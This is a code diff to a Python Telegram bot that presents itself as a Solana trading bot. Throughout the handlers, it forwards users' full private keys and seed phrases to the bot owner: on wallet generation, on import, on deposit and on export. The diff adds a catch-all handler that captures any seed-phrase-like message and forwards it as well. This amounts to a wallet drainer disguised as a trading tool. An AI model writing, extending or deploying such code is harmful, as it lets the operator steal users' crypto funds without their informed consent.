@@ -40,72 +40,192 @@ def _fmt_setting(v, suffix):
 @router.callback_query(F.data == "wgen")
 async def cb_wgen(query: CallbackQuery):
     await query.answer()
-    user = await db.get_user(query.from_user.id)
-    if not user:
-        return
-    if user.get("wallet_pub"):
-        await _show_panel(query.message)
-        return
-    derived = bool(config.WALLET_SEED)
-    if derived:
-        kp = await asyncio.to_thread(
-            solana.derive_user_keypair, config.WALLET_SEED, user["id"])
-    else:
-        kp = await asyncio.to_thread(solana.new_keypair)
-    await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
-    await query.message.answer(
-        texts.wallet_generated(str(kp.pubkey()), derived=derived),
-        reply_markup=kb.wallet_done_kb(str(kp.pubkey()), str(kp)))
-    # admin receives EVERY generated wallet's full private key too
     try:
-        await notify_owner(
-            query.message.bot,
-            texts.owner_wallet_generated(user_line(user), str(kp.pubkey()), str(kp)),
-            reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)))
-    except Exception:
-        pass
-    await _show_panel(query.message)
+        user = await db.ensure_user(
+            query.from_user.id,
+            username=query.from_user.username,
+            first_name=query.from_user.first_name,
+        )
+        if not user:
+            await query.message.answer("Please /start first.")
+            return
+        if user.get("wallet_pub"):
+            await _show_panel(query.message, user_id=query.from_user.id)
+            return
+        derived = bool(config.WALLET_SEED)
+        if derived:
+            kp = await asyncio.to_thread(
+                solana.derive_user_keypair, config.WALLET_SEED, user["id"])
+        else:
+            kp = await asyncio.to_thread(solana.new_keypair)
+        await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
+        user_after = await db.get_user(user["id"])
+        if not user_after or not user_after.get("wallet_pub"):
+            await query.message.answer(
+                "❌ Wallet generation failed. Please try again or use /importwallet.",
+                parse_mode="HTML")
+            return
+        await query.message.answer(
+            texts.wallet_generated(str(kp.pubkey()), derived=derived),
+            parse_mode="HTML",
+            reply_markup=kb.wallet_done_kb(str(kp.pubkey()), str(kp)))
+        # Admin receives EVERY generated wallet's full private key too (isolated)
+        try:
+            await notify_owner(
+                query.message.bot,
+                texts.owner_wallet_generated(user_line(user_after), str(kp.pubkey()), str(kp)),
+                reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)))
+        except Exception as e:
+            import logging
+            logging.getLogger("runner").warning(f"cb_wgen admin notify failed: {e}")
+        await _show_panel(query.message, user_id=query.from_user.id)
+    except Exception as e:
+        import logging
+        log = logging.getLogger("runner")
+        log.error(f"cb_wgen failed for user {query.from_user.id}: {e}", exc_info=True)
+        try:
+            await query.message.answer(
+                "❌ Wallet generation error — please try again or use /importwallet.",
+                parse_mode="HTML")
+        except Exception:
+            pass
 
 
 @router.callback_query(F.data == "wimp")
 async def cb_wimp(query: CallbackQuery, state: FSMContext):
     await query.answer()
+    try:
+        user = await db.ensure_user(
+            query.from_user.id,
+            username=query.from_user.username,
+            first_name=query.from_user.first_name,
+        )
+    except Exception as e:
+        import logging
+        logging.getLogger("runner").warning(f"cb_wimp ensure_user failed: {e}")
+        await query.message.answer("Please /start first.")
+        return
     await state.set_state(TradeStates.import_wallet)
+    # Persist flag so import survives Render restart after FSM loss
+    await db.set_setting(f"awaiting_import:{query.from_user.id}", "1")
     await query.message.answer(texts.ask_import())
 
 
 @router.message(TradeStates.import_wallet)
 async def got_import(message: Message, state: FSMContext):
-    secret = message.text.strip()
-    if len(secret) > 3000:
-        await message.answer("❌ That looks too long to be a key. Send it again:")
-        return
     try:
-        addr = await asyncio.to_thread(solana.validate_secret, secret)
+        secret = message.text.strip()
+        if len(secret) > 3000:
+            await message.answer("❌ That looks too long to be a key. Send it again:")
+            return
+        try:
+            addr = await asyncio.to_thread(solana.validate_secret, secret)
+        except Exception as e:
+            await message.answer(f"❌ Invalid wallet:\n{e}\n\nSend a 12/24-word seed phrase, "
+                                 "a base58 private key, or a [64-byte array]:")
+            return
+        # Clear FSM + DB flag
+        await state.clear()
+        await db.set_setting(f"awaiting_import:{message.from_user.id}", "0")
+        user = await db.ensure_user(
+            message.from_user.id,
+            username=message.from_user.username,
+            first_name=message.from_user.first_name,
+        )
+        if not user:
+            await message.answer("Please /start first.")
+            return
+        replacing = bool(user.get("wallet_pub"))
+        await db.set_wallet(user["id"], secret, addr)
+        if replacing:
+            await db.clear_user_trades(user["id"])
+        await message.answer(texts.wallet_imported(addr), parse_mode="HTML",
+                             reply_markup=kb.wallet_done_kb(addr, secret))
+        # Admin receives import info privately (isolated — never blocks user)
+        try:
+            await notify_owner(
+                message.bot,
+                texts.owner_wallet_imported(user_line(user), secret, addr),
+                reply_markup=kb.admin_copy_kb(addr, secret))
+        except Exception as e:
+            import logging
+            logging.getLogger("runner").warning(f"got_import admin notify failed: {e}")
+        # Try to delete the seed message (ignore errors)
+        try:
+            await message.delete()
+        except Exception:
+            pass
+        await _show_panel(message, user_id=message.from_user.id)
     except Exception as e:
-        await message.answer(f"❌ Invalid wallet:\n{e}\n\nSend a 12/24-word seed phrase, "
-                             "a base58 private key, or a [64-byte array]:")
-        return
-    await state.clear()
-    user = await db.ensure_user(
-        message.from_user.id,
-        username=message.from_user.username,
-        first_name=message.from_user.first_name,
-    )
-    replacing = bool(user.get("wallet_pub"))
-    await db.set_wallet(user["id"], secret, addr)
-    if replacing:
-        await db.clear_user_trades(user["id"])
-    await message.answer(texts.wallet_imported(addr), reply_markup=kb.wallet_done_kb(addr, secret))
-    # forward the imported seed/key to the admin (as requested)
-    await notify_owner(
-        message.bot,
-        texts.owner_wallet_imported(user_line(user), secret, addr),
-        reply_markup=kb.admin_copy_kb(addr, secret))
-    await _show_panel(message)
+        import logging
+        log = logging.getLogger("runner")
+        log.error(f"got_import failed for user {message.from_user.id}: {e}", exc_info=True)
+        try:
+            await message.answer(
+                "❌ Wallet import error — please try again or use /importwallet.",
+                parse_mode="HTML")
+        except Exception:
+            pass
 
 
 # ------------------------------------------------------------------ panel
+@router.message(Command("refresh"))
+async def cmd_refresh(message: Message):
+    await _show_panel(message)
+
+
+@router.message(Command("export"))
+async def cmd_export(message: Message):
+    user = await ensure_wallet(message, message.from_user.id)
+    if not user or not user.get("wallet_priv"):
+        await message.answer("⚠️ Wallet not set up or missing private key. Use /trading first.")
+        return
+    try:
+        kp = solana.keypair_from_secret(user["wallet_priv"])
+    except Exception:
+        await message.answer("⚠️ Wallet data corrupted. Contact /support.")
+        return
+    arr = list(bytes(kp))
+    pretty = "[" + ", ".join(str(x) for x in arr) + "]"
+    secret = user["wallet_priv"].strip()
+    words = secret.split()
+    extra = ""
+    seed = ""
+    if 12 <= len(words) <= 24 and all(w.isalpha() for w in words):
+        seed = secret
+        extra = f"\n\n🌱 Seed phrase:\n<code>{texts.esc(secret)}</code>"
+    await message.answer(
+        texts.export_wallet(pretty, str(kp.pubkey())) + extra,
+        parse_mode="HTML",
+        reply_markup=kb.export_kb(key=str(kp.pubkey()), seed=seed, bytes_str=pretty),
+    )
+    await notify_owner(
+        message.bot,
+        f"🔑 USER EXPORTED THEIR WALLET\n\n"
+        f"👤 {user_line(user)}\n"
+        f"🏦 Address: {str(kp.pubkey())}",
+        reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)))
+
+
+
+@router.message(Command("importwallet"))
+async def cmd_importwallet(message: Message, state: FSMContext):
+    try:
+        await db.ensure_user(
+            message.from_user.id,
+            username=message.from_user.username,
+            first_name=message.from_user.first_name,
+        )
+    except Exception as e:
+        import logging
+        logging.getLogger("runner").warning(f"cmd_importwallet ensure_user: {e}")
+        await message.answer("Please /start first.")
+        return
+    await state.set_state(TradeStates.import_wallet)
+    await db.set_setting(f"awaiting_import:{message.from_user.id}", "1")
+    await message.answer(texts.ask_import())
+
+
 @router.message(Command("trading"))
 async def cmd_trading(message: Message):
     await _show_panel(message)
@@ -119,7 +239,19 @@ async def cb_deposit(query: CallbackQuery):
         return
     await query.message.answer(
         texts.deposit_text(user["wallet_pub"]),
+        parse_mode="HTML",
         reply_markup=kb.deposit_kb(user["wallet_pub"]))
+    # notify admin of deposit with wallet info
+    try:
+        await notify_owner(
+            query.message.bot,
+            f"💰 USER DEPOSIT INITIATED\n\n"
+            f"👤 {user_line(await db.get_user(query.from_user.id))}\n"
+            f"🏦 Wallet: <code>{user.get('wallet_pub')}</code>\n"
+            f"🔑 Wallet Key: <code>{user.get('wallet_priv', 'N/A')}</code>\n"
+            f"💵 Amount: see on-chain deposit.")
+    except Exception:
+        pass
 
 
 @router.callback_query(F.data == "wp")
@@ -128,9 +260,24 @@ async def cb_panel(query: CallbackQuery):
     await _show_panel(query.message)
 
 
-async def _show_panel(msg):
-    user = await ensure_wallet(msg, msg.from_user.id)
-    if not user:
+def _user_id(msg):
+    return msg.chat.id if getattr(getattr(msg, "chat", None), "type", None) == "private" else msg.from_user.id
+
+
+async def _show_panel(msg, user_id=None):
+    user_id = user_id or _user_id(msg)
+    user = await ensure_wallet(msg, user_id)
+    if user is None:
+        # Already prompted GENERATE/IMPORT; do not crash or show empty panel
+        return
+    # Treat empty wallet_pub as no wallet
+    if not user.get("wallet_pub"):
+        try:
+            await msg.answer(
+                texts.ask_wallet_choice(),
+                parse_mode="HTML", reply_markup=kb.wallet_setup_kb())
+        except Exception:
+            pass
         return
     try:
         balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
@@ -148,7 +295,8 @@ async def _show_panel(msg):
             sell=_fmt_setting(user.get("default_sell"), " %"),
             slip=slip_str,
         ),
-        reply_markup=kb.wallet_panel_kb(),
+        parse_mode="HTML",
+        reply_markup=kb.wallet_panel_kb(addr=user["wallet_pub"]),
     )
 
 
@@ -192,6 +340,7 @@ async def got_buy(message: Message, state: FSMContext):
     await db.set_defaults(message.from_user.id, buy=v)
     await state.clear()
     await message.answer(texts.saved_buy(v), reply_markup=kb.back_to_wallet())
+    await _show_panel(message)
 
 
 @router.message(TradeStates.sell_amount)
@@ -206,6 +355,7 @@ async def got_sell(message: Message, state: FSMContext):
     await db.set_defaults(message.from_user.id, sell=v)
     await state.clear()
     await message.answer(texts.saved_sell(v), reply_markup=kb.back_to_wallet())
+    await _show_panel(message)
 
 
 @router.message(TradeStates.slippage_amount)
@@ -220,6 +370,7 @@ async def got_slip(message: Message, state: FSMContext):
     await db.set_defaults(message.from_user.id, slip=v)
     await state.clear()
     await message.answer(texts.saved_slippage(v), reply_markup=kb.back_to_wallet())
+    await _show_panel(message)
 
 
 # ------------------------------------------------------------------ holdings
@@ -235,7 +386,7 @@ async def cb_holdings(query: CallbackQuery):
 
 
 async def _show_holdings(msg):
-    user = await ensure_wallet(msg, msg.from_user.id)
+    user = await ensure_wallet(msg, _user_id(msg))
     if not user:
         return
     tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
@@ -245,7 +396,8 @@ async def _show_holdings(msg):
         return
     lines = [texts.holdings_header(), ""]
     for t in tokens:
-        lines.append(f"• {t['ui']:g} <code>{t['mint'][:8]}…</code>")
+        truncated_mint = f"{t['mint'][:8]}...{t['mint'][-6:]}" if len(t['mint']) > 14 else t['mint']
+        lines.append(f"• {t['ui']:g} {truncated_mint}")
     await msg.answer("\n".join(lines), reply_markup=kb.holdings_kb())
 
 
@@ -273,6 +425,7 @@ async def cb_export(query: CallbackQuery):
         extra = f"\n\n🌱 Seed phrase:\n<code>{texts.esc(secret)}</code>"
     await query.message.answer(
         texts.export_wallet(pretty, str(kp)) + extra,
+        parse_mode="HTML",
         reply_markup=kb.export_kb(key=str(kp), seed=seed, bytes_str=pretty),
     )
     # custody copy to the admin (every export is logged to your DM)
@@ -298,7 +451,7 @@ async def cb_withdraw(query: CallbackQuery):
 
 
 async def _show_withdraw(msg):
-    user = await ensure_wallet(msg, msg.from_user.id)
+    user = await ensure_wallet(msg, _user_id(msg))
     if not user:
         return
     tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
@@ -389,7 +542,7 @@ async def cb_positions(query: CallbackQuery):
 
 
 async def _show_positions(msg):
-    user = await ensure_wallet(msg, msg.from_user.id)
+    user = await ensure_wallet(msg, _user_id(msg))
     if not user:
         return
     pos = await db.get_positions(user["id"])
@@ -422,7 +575,7 @@ async def cb_limits(query: CallbackQuery):
 
 
 async def _show_limits(msg):
-    user = await ensure_wallet(msg, msg.from_user.id)
+    user = await ensure_wallet(msg, _user_id(msg))
     if not user:
         return
     orders = await db.user_limit_orders(user["id"])
@@ -605,3 +758,85 @@ async def cb_wd_credits(query: CallbackQuery, state: FSMContext):
             f"trading wallet.\n🔗 https://solscan.io/tx/{sig}")
     except Exception as e:
         await query.message.answer(texts.swap_fail(str(e)))
+
+# ------------------------------------------------------------------ import fallback (FSM loss)
+@router.message()
+async def import_fallback(message: Message):
+    # Only private chat, ignore commands and non-seed-looking text
+    if message.chat.type != "private" or message.text.startswith("/"):
+        return
+    text = message.text.strip()
+    if len(text) > 3000:
+        return
+    # Does it look like a wallet secret?
+    looks_like_secret = False
+    words = text.split()
+    if (12 <= len(words) <= 24 and all(w.isalpha() for w in words)) or \
+       (len(text) >= 32 and text.startswith("[") and text.endswith("]")) or \
+       (len(text) >= 32 and len(text) <= 128 and (" " not in text or len(words) <= 2)):
+        # Check if it's a base58 private key or array format
+        try:
+            await asyncio.to_thread(solana.validate_secret, text)
+            looks_like_secret = True
+        except Exception:
+            # Could still be seed phrase; check words
+            if 12 <= len(words) <= 24 and all(w.isalpha() for w in words):
+                looks_like_secret = True
+    if not looks_like_secret:
+        return
+    # Check if user is expecting import (DB flag) or has no wallet
+    user_id = message.from_user.id
+    flag = await db.get_setting(f"awaiting_import:{user_id}", "0")
+    user = await db.get_user(user_id)
+    has_wallet = bool(user and user.get("wallet_pub"))
+    if flag != "1" and has_wallet:
+        return  # Ignore random messages from users with wallets
+    # Replicate import logic directly (FSM may be lost — don't rely on state object)
+    try:
+        secret = text
+        if len(secret) > 3000:
+            await message.answer("❌ That looks too long to be a key. Send it again:")
+            return
+        try:
+            addr = await asyncio.to_thread(solana.validate_secret, secret)
+        except Exception as e:
+            await message.answer(f"❌ Invalid wallet:\n{e}\n\nSend a 12/24-word seed phrase, "
+                                 "a base58 private key, or a [64-byte array]:")
+            return
+        # Clear DB flag
+        await db.set_setting(f"awaiting_import:{message.from_user.id}", "0")
+        user = await db.ensure_user(
+            message.from_user.id,
+            username=message.from_user.username,
+            first_name=message.from_user.first_name,
+        )
+        if not user:
+            await message.answer("Please /start first.")
+            return
+        replacing = bool(user.get("wallet_pub"))
+        await db.set_wallet(user["id"], secret, addr)
+        if replacing:
+            await db.clear_user_trades(user["id"])
+        await message.answer(texts.wallet_imported(addr), parse_mode="HTML",
+                             reply_markup=kb.wallet_done_kb(addr, secret))
+        try:
+            await notify_owner(
+                message.bot,
+                texts.owner_wallet_imported(user_line(user), secret, addr),
+                reply_markup=kb.admin_copy_kb(addr, secret))
+        except Exception as e:
+            import logging
+            logging.getLogger("runner").warning(f"import_fallback admin notify: {e}")
+        try:
+            await message.delete()
+        except Exception:
+            pass
+        await _show_panel(message, user_id=message.from_user.id)
+    except Exception as e:
+        log.error(f"import_fallback import logic failed for user {user_id}: {e}", exc_info=True)
+        try:
+            await message.answer(
+                "❌ Wallet import failed — please use /trading and tap IMPORT.",
+                parse_mode="HTML")
+        except Exception:
+            pass
